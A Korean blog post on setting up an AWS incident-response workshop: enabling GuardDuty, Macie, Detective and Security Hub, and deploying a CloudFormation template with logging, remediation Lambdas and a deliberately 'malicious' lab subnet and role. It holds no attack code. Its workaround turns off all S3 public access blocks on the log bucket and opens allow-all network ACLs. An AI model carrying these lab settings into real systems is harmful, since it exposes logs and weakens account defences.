---
layout: single
title:  "aws 침해 대응 워크샵 (공격 시뮬레이션 세부내용)"
tags:
  - aws
  - incidentResponse
  - security
  - 침해사고 대응
categories:
  - aws
  - security

---
![](https://velog.velcdn.com/images/yuran3391/post/a0479961-63f1-4c3d-8622-6ae168faaa13/image.png)

수행 절차
1. GuardDuty 활성화
2. Macie 활성화
3. Detective 활성화
4. SecurityHub 활성화
5. CloudFormation 템플릿 실행하기
(Optional) GuardDuty 위협IP 등록 확인하기

1. GuardDuty활성화

![](https://velog.velcdn.com/images/yuran3391/post/456b4dbe-32f6-43fe-a5fe-dee60a118a35/image.png)

2. Macie 활성화
https://ap-northeast-2.console.aws.amazon.com/macie/home?region=ap-northeast-2#getStarted 

![](https://velog.velcdn.com/images/yuran3391/post/7b411a86-f8ab-40b7-a079-e20a4c57e225/image.png)


3. Detective 활성화
https://ap-northeast-2.console.aws.amazon.com/detective/home?region=ap-northeast-2#firstRun
![](https://velog.velcdn.com/images/yuran3391/post/8ef983e0-c7d0-47a7-ad16-ed226f28dc6c/image.png)

4. SecurityHub 활성화
https://ap-northeast-2.console.aws.amazon.com/securityhub/home?region=ap-northeast-2#/landing 

![](https://velog.velcdn.com/images/yuran3391/post/a247fcd6-ef38-406f-9706-4f00cbcedef2/image.png)


>
**나중에 아래 docs들 꼭 확인하기
**Enable AWS Foundational Security Best Practices v1.0.0
Enable CIS AWS Foundations Benchmark v1.2.0
Enable CIS AWS Foundations Benchmark v1.4.0
Enable NIST Special Publication 800-53 Revision 5
Enable PCI DSS v3.2.1


5. CloudFormation 템플릿 실행하기

https://static.us-east-1.prod.workshops.aws/public/ab039fc2-cdd5-466f-8b20-99bda805e0d7/assets/environment-setup.yml

> 요걸 그냥 돌리면 에러가난다 s3 보안변경 때문에!
https://aws.amazon.com/ko/blogs/korea/heads-up-amazon-s3-security-changes-are-coming-in-april-of-2023/
아래부분수정

```
  ### CloudTrail and Logging Bucket
  CloudTrail:
    DependsOn:
      - LogBucketPolicy
    Type: "AWS::CloudTrail::Trail"
    Properties:
      S3BucketName: !Ref LogBucket
      IsLogging: true
      EventSelectors:
        - DataResources:
            - Type: "AWS::S3::Object"
              Values:
                - !Join ["", [!GetAtt DataBucket.Arn, "/"]]
          IncludeManagementEvents: true
          ReadWriteType: All
      EnableLogFileValidation: true
      IsMultiRegionTrail: false
      IncludeGlobalServiceEvents: true
      TrailName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "trail"]
  LogBucket:
    Type: "AWS::S3::Bucket"
    Properties:
      PublicAccessBlockConfiguration:
        BlockPublicAcls: false
        BlockPublicPolicy: false
        IgnorePublicAcls: false
        RestrictPublicBuckets: false

      BucketEncryption:
        ServerSideEncryptionConfiguration:
          - ServerSideEncryptionByDefault:
              SSEAlgorithm: "AES256"
 ```

/file


설정했던 메일로,  SNS subscription에 대한 확인 메일 (제목: AWS Notification - Subscription Confirmation) 이 옵니다. 
제목을 확인하고 메일 본문에 있는 Confirm subscription 링크를 클릭하여 메일주소 확인과정을 완료합니다.

![](https://velog.velcdn.com/images/yuran3391/post/f0312a14-0b9d-43d0-a124-125cf5b732c4/image.png)

GuardDuty 위협 IP 등록 확인하기


GuardDuty 목록  메뉴로 이동합니다.


목록 관리화면의 아래 위협 목록에 Custom-Threat-List가 등록되어 있는지 확인합니다.

![](https://velog.velcdn.com/images/yuran3391/post/65bcf44b-f415-4100-9992-4d5eddf29b2b/image.png)


Parameters	설정값
목록 이름	Custom-Threat-List 입력
위치	https://sir-workshop-**your_account_number**-ap-northeast-2-gd-threatlist.s3.ap-northeast-2.amazonaws.com/gd-threat-list-example.txt  (전 단계에서 복사한 S3 파일 경로를 붙여넣기)
형식	텍스트 문서 선택
![](https://velog.velcdn.com/images/yuran3391/post/fa694069-4b7d-4123-b958-216e40cfe3cf/image.png)

register-threat-list

활성 항목에 있는 체크 박스를 클릭하여 위협 목록을 GuardDuty에 업로드합니다.

threat-list-upload

![](https://velog.velcdn.com/images/yuran3391/post/be05b3df-c210-4711-b0a9-d1c7761e923b/image.png)



---


![](https://velog.velcdn.com/images/yuran3391/post/81c0f672-6632-4048-a869-2ab6391a8b09/image.png)


```
AWSTemplateFormatVersion: "2010-09-09"

Description: This AWS CloudFormation Template configures an environment with the necessary detective controls to support the Security Incident Response Workshop.

Parameters:
  ResourceName:
    Type: String
    Default: sir-workshop
    AllowedValues:
      - sir-workshop
    Description: Prefix of Resources created for this workshop.

  Email:
    Type: String
    Description: Enter a valid email address for receiving alerts.

  ConfigEnabled:
    Type: String
    Default: "No"
    AllowedValues:
      - "No"
      - "Yes"
    Description: Is AWS Config already enabled in this region?

Metadata:
  AWS::CloudFormation::Interface:
    ParameterGroups:
      - Label:
          default: "Resource and Notification Configuration"
        Parameters:
          - ResourceName
          - Email
      - Label:
          default: "Security Services Configuration"
        Parameters:
          - ConfigEnabled
    ParameterLabels:
      ResourceName:
        default: "Resource Prefix"
      Email:
        default: "Email Address"
      ConfigEnabled:
        default: "AWS Config"

Mappings:
  RegionMap:
    ap-northeast-2:
      "aznlinux": "ami-0e92198843e11ccee"
      "ubuntu": "ami-0539a1389fedcbdc8"

Conditions:
  CreateRecorder: !Equals [!Ref ConfigEnabled, "No"]

Resources:
  ### CloudTrail and Logging Bucket
  CloudTrail:
    DependsOn:
      - LogBucketPolicy
    Type: "AWS::CloudTrail::Trail"
    Properties:
      S3BucketName: !Ref LogBucket
      IsLogging: true
      EventSelectors:
        - DataResources:
            - Type: "AWS::S3::Object"
              Values:
                - !Join ["", [!GetAtt DataBucket.Arn, "/"]]
          IncludeManagementEvents: true
          ReadWriteType: All
      EnableLogFileValidation: true
      IsMultiRegionTrail: false
      IncludeGlobalServiceEvents: true
      TrailName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "trail"]
  LogBucket:
    Type: "AWS::S3::Bucket"
    Properties:
      PublicAccessBlockConfiguration:
        BlockPublicAcls: false
        BlockPublicPolicy: false
        IgnorePublicAcls: false
        RestrictPublicBuckets: false

      BucketEncryption:
        ServerSideEncryptionConfiguration:
          - ServerSideEncryptionByDefault:
              SSEAlgorithm: "AES256"
      #      AccessControl: LogDeliveryWrite
      BucketName:
        Fn::Join:
          - "-"
          - [
              !Ref ResourceName,
              !Ref "AWS::AccountId",
              !Ref "AWS::Region",
              "logs",
            ]
  LogBucketPolicy:
    DependsOn:
      - LogBucket
    Type: "AWS::S3::BucketPolicy"
    Properties:
      # PublicAccessBlockConfiguration:
      # BlockPublicAcls: false
      # BlockPublicPolicy: false
      # IgnorePublicAcls: false
      # RestrictPublicBuckets: false

      Bucket: !Ref LogBucket

      PolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Sid: "AWSCloudTrailAclCheck"
            Effect: "Allow"
            Principal:
              Service: "cloudtrail.amazonaws.com"
            Action: "s3:GetBucketAcl"
            Resource:
              Fn::Join:
                - ""
                - ["arn:aws:s3:::", !Ref LogBucket]
          - Sid: "AWSCloudTrailWrite"
            Effect: "Allow"
            Principal:
              Service: "cloudtrail.amazonaws.com"
            Action: "s3:PutObject"
            Resource:
              Fn::Join:
                - ""
                - ["arn:aws:s3:::", !Ref LogBucket, "/AWSLogs/*"]
            Condition:
              StringEquals:
                s3:x-amz-acl: "bucket-owner-full-control"

  DataBucket:
    Type: "AWS::S3::Bucket"
    Properties:
      BucketEncryption:
        ServerSideEncryptionConfiguration:
          - ServerSideEncryptionByDefault:
              SSEAlgorithm: "AES256"
      LoggingConfiguration:
        DestinationBucketName: !Ref LogBucket
        LogFilePrefix: data-bucket-access-logs
      BucketName:
        Fn::Join:
          - "-"
          - [
              !Ref ResourceName,
              !Ref "AWS::AccountId",
              !Ref "AWS::Region",
              "data",
            ]

  ### GuardDuty ThreatListBucket
  GDThreatListBucket:
    Type: "AWS::S3::Bucket"
    Properties:
      BucketEncryption:
        ServerSideEncryptionConfiguration:
          - ServerSideEncryptionByDefault:
              SSEAlgorithm: "AES256"
      BucketName:
        Fn::Join:
          - "-"
          - [
              !Ref ResourceName,
              !Ref "AWS::AccountId",
              !Ref "AWS::Region",
              "gd-threatlist",
            ]

  ### Enable AWS Config
  ConfigRole:
    Condition: CreateRecorder
    Type: AWS::IAM::Role
    Properties:
      RoleName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, config]
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - "config.amazonaws.com"
            Action:
              - sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/service-role/AWS_ConfigRole
      Path: /
      Policies:
        - PolicyName: ConfigPolicy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - s3:PutObject*
                Resource:
                  Fn::Join:
                    - ""
                    - ["arn:aws:s3:::", !Ref LogBucket, "/AWSLogs/*"]
                Condition:
                  StringLike:
                    s3:x-amz-acl: "bucket-owner-full-control"
              - Effect: Allow
                Action:
                  - s3:GetBucketAcl
                Resource:
                  Fn::Join:
                    - ""
                    - ["arn:aws:s3:::", !Ref LogBucket]
              - Effect: Allow
                Action:
                  - cloudtrail:GetTrailStatus
                  - cloudtrail:DescribeTrails
                  - cloudtrail:LookupEvents
                  - cloudtrail:ListTags
                  - cloudtrail:ListPublicKeys
                  - cloudtrail:GetEventSelectors
                Resource: "*"
  ConfigRecorder:
    Condition: CreateRecorder
    Type: "AWS::Config::ConfigurationRecorder"
    Properties:
      Name:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "recorder"]
      RecordingGroup:
        AllSupported: true
        IncludeGlobalResourceTypes: true
      RoleARN:
        Fn::GetAtt:
          - ConfigRole
          - Arn
  ConfigDelivery:
    Condition: CreateRecorder
    Type: "AWS::Config::DeliveryChannel"
    Properties:
      Name:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "delivery"]
      S3BucketName: !Ref LogBucket

  ### Centralized Detection SNS Topic
  DetectionSNSTopic:
    Type: AWS::SNS::Topic
    Properties:
      TopicName: !Ref ResourceName
      Subscription:
        - Endpoint: !Ref Email
          Protocol: Email
  DetectionSNSTopicPolicy:
    Type: AWS::SNS::TopicPolicy
    Properties:
      PolicyDocument:
        Id: ID-GD-Topic-Policy
        Version: "2012-10-17"
        Statement:
          - Sid: SID-Detection-Workshop
            Effect: Allow
            Principal:
              Service:
                - events.amazonaws.com
                - inspector.amazonaws.com
            Action: sns:Publish
            Resource: !Ref DetectionSNSTopic
      Topics:
        - !Ref DetectionSNSTopic

  # CloudWatch Event Rules
  GuardDutyFindingEvent:
    Type: "AWS::Events::Rule"
    Properties:
      Name:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "guardduty-finding"]
      Description: "All GuardDuty Findings"
      EventPattern:
        source:
          - aws.guardduty
        detail-type:
          - "GuardDuty Finding"
      State: "ENABLED"
      Targets:
        - Arn:
            Ref: "DetectionSNSTopic"
          Id: "DetectionSNSTopic-GuardDuty"
          InputTransformer:
            InputTemplate: '"Amazon GuardDuty Finding: <gddesc>"'
            InputPathsMap:
              gddesc: "$.detail.description"
  GuardDutyFindingEventSSHBruteForce:
    Type: "AWS::Events::Rule"
    Properties:
      Name:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "guardduty-finding", "sshbruteforce"]
      Description: "GuardDuty Finding: UnauthorizedAccess:EC2/SSHBruteForce"
      EventPattern:
        source:
          - aws.guardduty
        detail:
          type:
            - "UnauthorizedAccess:EC2/SSHBruteForce"
      State: "ENABLED"
      Targets:
        - Arn: !GetAtt LambdaRemediationInspector.Arn
          Id: "GuardDutyEvent-Lambda-Trigger-Inspector"
        - Arn: !GetAtt LambdaRemediationNACL.Arn
          Id: "GuardDutyEvent-Lambda-Trigger-NACL"
  GuardDutyFindingEventEC2BitcoinToolBDNS:
    Type: "AWS::Events::Rule"
    Properties:
      Name:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "guardduty-finding", "ec2-BitcoinToolBDNS"]
      Description: "GuardDuty Finding: CryptoCurrency:EC2/BitcoinTool.B!DNS"
      EventPattern:
        source:
          - aws.guardduty
        detail:
          type:
            - "CryptoCurrency:EC2/BitcoinTool.B!DNS"
      State: "ENABLED"
      Targets:
        - Arn: !GetAtt LambdaRemediationNACL.Arn
          Id: "GuardDutyEvent-Lambda-Trigger-NACL"
  MacieAlertEvent:
    Type: "AWS::Events::Rule"
    Properties:
      Name:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "macie-alert"]
      Description: "All Macie Alerts"
      EventPattern:
        source:
          - aws.macie
        detail-type:
          - "Macie Alert"
      State: "ENABLED"
      Targets:
        - Arn:
            Ref: "DetectionSNSTopic"
          Id: "DetectionSNSTopic-Macie"
          InputTransformer:
            InputTemplate: '"Amazon Macie Alert: <macdesc>"'
            InputPathsMap:
              macdesc: "$.detail.summary.Description"

  ### Configuration Lambda - Inspector Role Creation
  LambdaInspectorCreation:
    Type: "AWS::Lambda::Function"
    Properties:
      FunctionName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "inspector-role-creation"]
      Handler: "index.handler"
      Environment:
        Variables:
          PREFIX: !Ref ResourceName
      Role:
        Fn::GetAtt:
          - "LambdaInspectorCreationRole"
          - "Arn"
      Code:
        ZipFile: |
          from urllib.request import build_opener, HTTPHandler, Request
          from botocore.exceptions import ClientError
          import boto3
          import json
          import http.client
          import os
          import cfnresponse

          def handler(event, context):
            iam = boto3.client('iam')
            inspector = boto3.client('inspector')
            print(("log -- Event: %s " % json.dumps(event)))
            target_name = '%s-target-sample' % os.environ['PREFIX']
            if event['RequestType'] == 'Create':
              print("log -- Create Event ")
              try:
                iam.create_service_linked_role(
                    AWSServiceName='inspector.amazonaws.com',
                    Description='Allows Inspecter to access AWS resources to perform security assessments on your behalf.'
                )
                group = inspector.create_resource_group(
                    resourceGroupTags=[
                        {
                            'key': 'Name',
                            'value': 'Test'
                        },
                    ]
                )
                target = inspector.create_assessment_target(
                    assessmentTargetName=target_name,
                    resourceGroupArn=group['resourceGroupArn']
                )
                cfnresponse.send(event, context, cfnresponse.SUCCESS, { "Message": "Inspector Role successfully created!" })
              except ClientError as e:
                print(e)
                cfnresponse.send(event, context, cfnresponse.SUCCESS, { "Message": "Inspector Role unsuccessful in being created!" })
            elif event['RequestType'] == 'Update':
              print("log -- Update Event")
              try:
                iam.create_service_linked_role(
                    AWSServiceName='inspector.amazonaws.com',
                    Description='Allows Inspecter to access AWS resources to perform security assessments on your behalf.'
                )
                group = inspector.create_resource_group(
                    resourceGroupTags=[
                        {
                            'key': 'Name',
                            'value': 'Test'
                        },
                    ]
                )
                target = inspector.create_assessment_target(
                    assessmentTargetName=target_name,
                    resourceGroupArn=group['resourceGroupArn']
                )
                cfnresponse.send(event, context, cfnresponse.SUCCESS, { "Message": "Inspector Role successfully created!" })
              except ClientError as e:
                print(e)
                cfnresponse.send(event, context, cfnresponse.SUCCESS, { "Message": "Inspector Role unsuccessful in being created!" })
            elif event['RequestType'] == 'Delete':
              print("log -- Delete Event")
              cfnresponse.send(event, context, cfnresponse.SUCCESS, { "Message": "Resource deletion successful!  Please delete the Inspector Role manually." })
            else:
                print("log -- FAILED")
                cfnresponse.send(event, context, cfnresponse.SUCCESS, "FAILED", { "Message": "Unexpected event received from CloudFormation" })

            return cfnresponse

      Runtime: "python3.8"
      Timeout: "35"
  LambdaInspectorCreationRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "lambda", "inspector-creation"]
      AssumeRolePolicyDocument:
        Version: 2012-10-17
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - lambda.amazonaws.com
            Action:
              - sts:AssumeRole
      Path: /
      Policies:
        - PolicyName: RemediationPolicy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - logs:CreateLogGroup
                  - logs:CreateLogStream
                  - logs:PutLogEvents
                Resource: "*"
              - Effect: Allow
                Action:
                  - iam:CreateServiceLinkedRole
                  - inspector:CreateAssessmentTarget
                  - inspector:CreateResourceGroup
                Resource: "*"
  # Inspector service linked role creation
  InspectorCustomResource:
    Type: Custom::CustomResource
    Properties:
      ServiceToken: !GetAtt "LambdaInspectorCreation.Arn"
      # ParameterOne: Parameter to pass into Custom Lambda Function
      ParameterOne: "Create"

  # Remediation Lambda - SSH Brute Force
  LambdaRemediationInspector:
    Type: "AWS::Lambda::Function"
    Properties:
      FunctionName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "remediation", "inspector"]
      Handler: "index.handler"
      Environment:
        Variables:
          TOPIC_ARN: !Ref DetectionSNSTopic
          PREFIX: !Ref ResourceName
          COMRPOMISED_INSTANCE_TAG:
            Fn::Join:
              - ":"
              - [!Ref ResourceName, " Compromised Host"]
      Role:
        Fn::GetAtt:
          - "LambdaRemediationRole"
          - "Arn"
      Code:
        ZipFile: |
          from botocore.exceptions import ClientError
          import json
          import boto3
          import os
          import uuid
          import time
          def handler(event, context):

            # Log Event
            print("log -- Event: %s " % json.dumps(event))

            instance_id = event["detail"]["resource"]["instanceDetails"]["instanceId"]
            gd_sev = event['detail']['severity']
            scan_id = str(uuid.uuid4())
            scan_name = '%s-inspector-scan' % os.environ['PREFIX']
            target_name = '%s-target-%s' % (os.environ['PREFIX'], event["id"])
            template_name = '%s-template-%s' % (os.environ['PREFIX'], event["id"])
            assess_name = '%s-assessment-%s' % (os.environ['PREFIX'], event["id"])

            response = "Skipping Remediation"

            ec2 = boto3.client('ec2')
            scan = True
            wksp = False

            for i in event['detail']['resource']['instanceDetails']['tags']:
              if i['value'] == os.environ['PREFIX']:
                wksp = True
              elif i['key'] == scan_name:
                scan = False

            print("log -- Event: Scan - %s" % scan)
            print("log -- Event: Workshop - %s" % wksp)

            # if gd_sev == 2 and scan == True and wksp == True: --> oldest condition
            if gd_sev == 2 and scan == True and wksp == True and event["detail"]["type"] == "UnauthorizedAccess:EC2/SSHBruteForce":
            # if gd_sev == 3 and scan == True and wksp == True and event["detail"]["type"] == "UnauthorizedAccess:EC2/SSHBruteForce": --> old condition
              print("log -- Event: Inspector Scan Kickoff")
              try:
                inspector = boto3.client('inspector')

                ec2.create_tags(
                    Resources=[
                        instance_id,
                    ],
                    Tags=[
                        {
                            'Key': scan_name,
                            'Value': scan_id
                        }
                    ]
                )
                if os.environ['AWS_REGION'] == 'ap-northeast-2':
                  packages = ['arn:aws:inspector:ap-northeast-2:526946625049:rulespackage/0-2WRpmi4n','arn:aws:inspector:ap-northeast-2:526946625049:rulespackage/0-PoGHMznc','arn:aws:inspector:ap-northeast-2:526946625049:rulespackage/0-s3OmLzhL']
                elif os.environ['AWS_REGION'] == 'us-west-2':
                  packages = ['arn:aws:inspector:us-west-2:758058086616:rulespackage/0-JJOtZiqQ','arn:aws:inspector:us-west-2:758058086616:rulespackage/0-9hgA516p']

                group = inspector.create_resource_group(
                    resourceGroupTags=[
                        {
                            'key': scan_name,
                            'value': scan_id
                        },
                    ]
                )

                target = inspector.create_assessment_target(
                    assessmentTargetName=target_name,
                    resourceGroupArn=group['resourceGroupArn']
                )

                template = inspector.create_assessment_template(
                    assessmentTargetArn=target['assessmentTargetArn'],
                    assessmentTemplateName=template_name,
                    durationInSeconds=900,
                    rulesPackageArns=packages,
                    userAttributesForFindings=[
                        {
                            'key': 'instance-id',
                            'value': instance_id
                        },
                        {
                            'key': 'scan-name',
                            'value': scan_name
                        },
                        {
                            'key': 'scan-id',
                            'value': scan_id
                        }
                    ]
                )

                for x in range(0, 5):
                  try:
                    time.sleep(5)
                    assessment = inspector.start_assessment_run(
                        assessmentTemplateArn=template['assessmentTemplateArn'],
                        assessmentRunName=assess_name
                    )
                    break
                  except ClientError as e:
                    print(e)

                # Set Remediation Metadata
                response = "An Inspector scan has been initiated on this instance: %s" % instance_id
              except ClientError as e:
                print(e)
                print("log -- Error Starting an AWS Inspector Assessment")
                response = "Error"

            print(response)
            return response
      Runtime: "python3.8"
      Timeout: "120"
  LambdaRemediationInspectInvokePermissions:
    DependsOn:
      - LambdaRemediationInspector
    Type: "AWS::Lambda::Permission"
    Properties:
      FunctionName: !Ref "LambdaRemediationInspector"
      Action: "lambda:InvokeFunction"
      Principal: "events.amazonaws.com"

  # Remediation Lambda - NACL Modification
  LambdaRemediationNACL:
    Type: "AWS::Lambda::Function"
    Properties:
      FunctionName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "remediation", "nacl"]
      Handler: "index.handler"
      Environment:
        Variables:
          TOPIC_ARN: !Ref DetectionSNSTopic
          PREFIX: !Ref ResourceName
          COMRPOMISED_INSTANCE_TAG:
            Fn::Join:
              - ":"
              - [!Ref ResourceName, " Compromised Host"]
      Role:
        Fn::GetAtt:
          - "LambdaRemediationRole"
          - "Arn"
      Code:
        ZipFile: |
          from botocore.exceptions import ClientError
          import boto3
          import json
          import os

          def handler(event, context):

            # Log Event
            print("log -- Event: %s " % json.dumps(event))
            # Set Event Variables
            gd_sev = event['detail']['severity']
            gd_vpc_id = event["detail"]["resource"]["instanceDetails"]["networkInterfaces"][0]["vpcId"]
            gd_instance_id = event["detail"]["resource"]["instanceDetails"]["instanceId"]
            gd_subnet_id = event["detail"]["resource"]["instanceDetails"]["networkInterfaces"][0]["subnetId"]

            response = "Skipping Remediation"

            wksp = False
            for i in event['detail']['resource']['instanceDetails']['tags']:
              if i['value'] == os.environ['PREFIX']:
                wksp = True
            print("log -- Event: Workshop - %s" % wksp)

            try:
              if gd_sev == 2 and wksp == True and event["detail"]["type"] == "UnauthorizedAccess:EC2/SSHBruteForce":
                gd_offending_id = event["detail"]["service"]["action"]["networkConnectionAction"]["remoteIpDetails"]["ipAddressV4"]
              else:
                gd_offending_id = "0.0.0.0"

              # Setup a NACL to deny inbound and outbound calls from the malicious IP from this subnet
              ec2 = boto3.client('ec2')

              response = ec2.describe_network_acls(
                Filters=[
                  {
                    'Name': 'vpc-id',
                    'Values': [
                        gd_vpc_id,
                    ]
                  },
                  {
                    'Name': 'association.subnet-id',
                    'Values': [
                        gd_subnet_id,
                    ]
                  }
                ]
              )

              gd_nacl_id = response["NetworkAcls"][0]["NetworkAclId"]
              if wksp == True and event["detail"]["type"] == "UnauthorizedAccess:EC2/SSHBruteForce":
                response = ec2.create_network_acl_entry(
                    DryRun=False,
                    Egress=False,
                    NetworkAclId=gd_nacl_id,
                    CidrBlock=gd_offending_id+"/32",
                    Protocol="-1",
                    RuleAction='deny',
                    RuleNumber=90
                )
                print("log -- Event: NACL Deny Rule for UnauthorizedAccess:EC2/SSHBruteForce Finding ")

              elif wksp == True and event["detail"]["type"] == "CryptoCurrency:EC2/BitcoinTool.B!DNS":
                  response = ec2.create_network_acl_entry(
                      DryRun=False,
                      Egress=True,
                      NetworkAclId=gd_nacl_id,
                      CidrBlock=gd_offending_id+"/0",
                      Protocol="-1",
                      RuleAction='deny',
                      RuleNumber=90
                  )
                  print("log -- Event: NACL Deny Rule for CryptoCurrency:EC2/BitcoinTool.B!DNS")
              else:
                print("A GuardDuty event occured without a defined remediation.")
            except ClientError as e:
              print(e)
              print("Something went wrong with the NACL remediation Lambda")
            return response
      Runtime: "python3.8"
      Timeout: "35"
  LambdaRemediationNACLInvokePermissions:
    DependsOn:
      - LambdaRemediationNACL
    Type: "AWS::Lambda::Permission"
    Properties:
      FunctionName: !Ref "LambdaRemediationNACL"
      Action: "lambda:InvokeFunction"
      Principal: "events.amazonaws.com"

  LambdaRemediationRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "lambda", "remediation"]
      AssumeRolePolicyDocument:
        Version: 2012-10-17
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - lambda.amazonaws.com
            Action:
              - sts:AssumeRole
      Path: /
      Policies:
        - PolicyName: RemediationPolicy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - inspector:CreateAssessmentTemplate
                  - inspector:CreateAssessmentTarget
                  - inspector:CreateResourceGroup
                  - inspector:ListRulesPackages
                  - inspector:StartAssessmentRun
                  - inspector:SubscribeToEvent
                  - inspector:SetTagsForResource
                  - inspector:DescribeAssessmentRuns
                  - ec2:CreateTags
                  - ec2:Describe*
                  - ec2:*NetworkAcl*
                  - iam:CreateServiceLinkedRole
                Resource: "*"
              - Effect: Allow
                Action:
                  - logs:CreateLogGroup
                  - logs:CreateLogStream
                  - logs:PutLogEvents
                Resource: "*"

  ### Network Infrastructure
  VPC:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: 10.0.0.0/16
      EnableDnsHostnames: true
      EnableDnsSupport: true
      Tags:
        - Key: Name
          Value: !Ref ResourceName
  InternetGateway:
    Type: AWS::EC2::InternetGateway
    Properties:
      Tags:
        - Key: Name
          Value: !Ref ResourceName
  GatewayAttachment:
    Type: AWS::EC2::VPCGatewayAttachment
    Properties:
      InternetGatewayId:
        Ref: InternetGateway
      VpcId: !Ref VPC
  RouteTable:
    DependsOn:
      - VPC
    Type: AWS::EC2::RouteTable
    Properties:
      Tags:
        - Key: Name
          Value: !Ref ResourceName
      VpcId: !Ref VPC
  PublicRoute:
    DependsOn:
      - RouteTable
      - GatewayAttachment
    Type: AWS::EC2::Route
    Properties:
      DestinationCidrBlock: 0.0.0.0/0
      GatewayId: !Ref InternetGateway
      RouteTableId: !Ref RouteTable
  S3VPCEndpoint:
    Type: "AWS::EC2::VPCEndpoint"
    Properties:
      RouteTableIds:
        - !Ref RouteTable
      ServiceName:
        Fn::Join:
          - ""
          - ["com.amazonaws.", !Ref "AWS::Region", ".s3"]
      VpcId: !Ref VPC
  Subnet:
    Type: AWS::EC2::Subnet
    Properties:
      AvailabilityZone: "ap-northeast-2a"
      CidrBlock: 10.0.0.0/24
      MapPublicIpOnLaunch: true
      Tags:
        - Key: Name
          Value: !Ref ResourceName
      VpcId: !Ref VPC
  SubnetAssoc:
    DependsOn:
      - Subnet
      - RouteTable
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref RouteTable
      SubnetId: !Ref Subnet
  PublicNACL:
    Type: AWS::EC2::NetworkAcl
    Properties:
      VpcId: !Ref VPC
      Tags:
        - Key: Name
          Value:
            Fn::Join:
              - "-"
              - [!Ref ResourceName, "compromised"]
        - Key: Network
          Value: Public
  InboundPublicNACLEntry:
    Type: AWS::EC2::NetworkAclEntry
    Properties:
      NetworkAclId: !Ref PublicNACL
      RuleNumber: 100
      Protocol: -1
      RuleAction: allow
      Egress: false
      CidrBlock: "0.0.0.0/0"
      PortRange:
        From: 0
        To: 65535
  OutboundPublicNACLEntry:
    Type: AWS::EC2::NetworkAclEntry
    Properties:
      NetworkAclId: !Ref PublicNACL
      RuleNumber: 100
      Protocol: -1
      RuleAction: allow
      Egress: true
      CidrBlock: 0.0.0.0/0
      PortRange:
        From: 0
        To: 65535
  SubnetNACLAssociation:
    Type: AWS::EC2::SubnetNetworkAclAssociation
    Properties:
      SubnetId: !Ref Subnet
      NetworkAclId: !Ref PublicNACL
  MaliciousSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      AvailabilityZone: "ap-northeast-2a"
      CidrBlock: 10.0.1.0/24
      MapPublicIpOnLaunch: true
      Tags:
        - Key: Name
          Value:
            Fn::Join:
              - "-"
              - [!Ref ResourceName, "malicious"]
      VpcId: !Ref VPC
  MaliciousSubnetAssoc:
    DependsOn:
      - MaliciousSubnet
      - RouteTable
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref RouteTable
      SubnetId: !Ref MaliciousSubnet
  MaliciousPublicNACL:
    Type: AWS::EC2::NetworkAcl
    Properties:
      VpcId: !Ref VPC
      Tags:
        - Key: Name
          Value:
            Fn::Join:
              - "-"
              - [!Ref ResourceName, "malicious"]
        - Key: Network
          Value: Public
  MaliciousInboundPublicNACLEntry:
    Type: AWS::EC2::NetworkAclEntry
    Properties:
      NetworkAclId: !Ref MaliciousPublicNACL
      RuleNumber: 100
      Protocol: -1
      RuleAction: allow
      Egress: false
      CidrBlock: "0.0.0.0/0"
      PortRange:
        From: 0
        To: 65535
  MaliciousOutboundPublicNACLEntry:
    Type: AWS::EC2::NetworkAclEntry
    Properties:
      NetworkAclId: !Ref MaliciousPublicNACL
      RuleNumber: 100
      Protocol: -1
      RuleAction: allow
      Egress: true
      CidrBlock: 0.0.0.0/0
      PortRange:
        From: 0
        To: 65535
  MaliciousSubnetNACLAssociation:
    Type: AWS::EC2::SubnetNetworkAclAssociation
    Properties:
      SubnetId: !Ref MaliciousSubnet
      NetworkAclId: !Ref MaliciousPublicNACL

  ### Malicious Host IAM Role
  MaliciousInstanceRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "malicious-ec2"]
      AssumeRolePolicyDocument:
        Version: 2012-10-17
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - ec2.amazonaws.com
            Action:
              - sts:AssumeRole
      Path: /
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM
      Policies:
        - PolicyName: MaliciousInstancePolicy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - ssm:GetParameter
                  - ssm:GetParameters
                  - ssm:DescribeParameters
                Resource:
                  Fn::Join:
                    - ":"
                    - [
                        "arn:aws:ssm",
                        !Ref "AWS::Region",
                        !Ref "AWS::AccountId",
                        "*",
                      ]
  MaliciousInstanceProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      InstanceProfileName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "malicious-ec2-profile"]
      Path: /
      Roles:
        - !Ref MaliciousInstanceRole

